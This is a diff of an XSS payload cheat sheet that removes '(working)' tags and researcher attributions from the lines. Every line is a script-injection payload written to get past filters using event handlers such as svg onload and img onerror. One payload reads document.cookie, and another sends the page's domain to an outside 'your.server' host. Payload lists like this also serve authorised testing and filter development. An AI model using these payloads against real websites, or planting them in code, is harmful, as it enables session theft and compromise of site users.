@@ -12,15 +12,15 @@ javascript:{ alert`0` }
 <svg on onload=(alert)(document.domain)>
 <img ignored=() src=x onerror=prompt(1)>
 <svg onx=() onload=(confirm)(1)>
-“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
-<svg on =i onload=alert(domain) (working)
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain)
 <svg/onload=location/**/='https://your.server/'+document.domain>
 <svg onx=() onload=window.alert?.()> (working)
-test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
-"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
-"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
+test",prompt%0A/*HelloWorld*/(document.domain)
+"onx+%00+onpointerenter%3dalert(domain)+x"
+"><svg%20onload=alert%26%230000000040"1")>
 %27%09);%0d%0a%09%09[1].find(alert)//
-"><img src=1 onmouseleave=print()> - @itsgeekymonk
-<svg on onload=(alert)(document.domain)> -@zapstiko
-<svg/on%20onload=alert(1)> (working) -@aufzayed
-<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+"><img src=1 onmouseleave=print()>
+<svg on onload=(alert)(document.domain)>
+<svg/on%20onload=alert(1)>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
